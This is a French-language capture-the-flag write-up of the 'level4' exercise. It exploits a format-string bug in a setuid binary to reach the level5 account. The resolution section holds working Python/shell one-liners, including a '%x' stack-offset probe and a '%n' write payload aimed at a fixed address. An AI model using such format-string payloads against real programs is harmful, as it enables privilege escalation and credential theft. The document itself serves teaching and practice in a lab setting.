## Comportement
- J'ai des droits `level4` que je peux vérifier en tapant `whoami`
- Un binaire est présent avec des droits différents : `-rwsr-s---+ 1 level5 users  5252 Mar  6  2016 level4*`
- En exécutant le binaire (`./level4`), on observe:
  - qu'il attend un input de notre part.
  - qu'il print notre input avant de quitter.
  - il ne segfault pas meme si l'input est long.


## Analyse
En analysant le binaire (`gdb ./level4`) on observe que la problematique est similaire a celle d el'exercice precedent. Les deux seules differences sont la nouvelle valeur de comparaison (`0x1025544`, qui correspond a `16930116`) et l'utilsation de `printf()` dans une fonction disctincte.


## Résolution
- On constate que notre buffer est la 12eme position
  ```shell
    python -c 'print "BBBB" + " %x" *15 ' | ./level4
    BBBB b7ff26b0 bffff694 b7fd0ff4 0 0 bffff658 804848d bffff450 200 b7fd1ac0 b7ff37d0 42424242 20782520 25207825 78252078
  ```
- Maintenant, comme dans l'exercice precedent on tente d'inscrire le nombre d'octets dans `m`. Mais c'est trop long, on a une erreur.
  ```shell
    python -c 'print "\x10\x98\x04\x08" + "B" * 16930112 + "%12$x"' | ./level4
    BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBTraceback (most recent call last):
    File "<string>", line 1, in <module>
    IOError: [Errno 32] Broken pipe
  ```
- On va alors utiliser le `%n` qui renvoi le nombre d'octets. Le programme va de lui meme aller chercher le mot de passe et l'afficher, pas besoin de le faire.
    ```shell
        python -c 'print "\x10\x98\x04\x08" + "%16930112d%12$n"' | ./level4
    ```
- Il ne reste plus qu'à passer au level5 (`su level5`) en renseignant ce password.
